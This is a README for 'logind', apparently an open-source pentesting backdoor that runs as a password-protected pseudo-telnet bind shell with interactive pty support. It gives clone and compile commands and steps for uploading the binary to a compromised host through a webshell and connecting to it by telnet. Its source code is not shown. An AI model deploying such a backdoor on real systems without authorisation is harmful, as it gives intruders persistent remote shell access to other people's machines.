# logind

Simple pseudo-telnetd backdoor with ptty support. 

It can be very useful in pentesting tasks when you can execute commands through webshell but you need interactive access. 

Can be combined with other tools such as 'htun' reverse port tunneler.

## Features

* Pentesting backdoor pseudo-telnetd
* Launch via webshell 
* Bindshell with interactive pttys support 
* Compatible Linux, Solaris, OSX and BSD. 

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

logind should run on any UNIX/Linux box. You only need a relatively modern gcc compiler.

### Installing

Download a copy of the project from github: 

```
$ git clone https://github.com/joseigbv/logind.git
```

Edit 'logind.c' and change configuration (optional).

Compile.

* linux: 
```
$ gcc -Wall -O2 logind.c -o logind -lutil
```
* osx: 
```
$ gcc -Wall -O2 logind.c -o logind
```
* solaris: 
```
$ gcc -Wall -O2 logind.c -o logind -lnsl -lsocket
```

### Usage 

Upload logind to the compromised host and launch using your webshell:

```
$ logind
```

logind dettach from terminal and run as daemon. Now, connect to the specified port using telnet, netcat, ...

```
$ telnet compromised-host 12345
password: [mypassword]
# 
```

## Authors

* **José Ignacio Bravo** - *Initial work* - nacho.bravo@gmail.com

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details
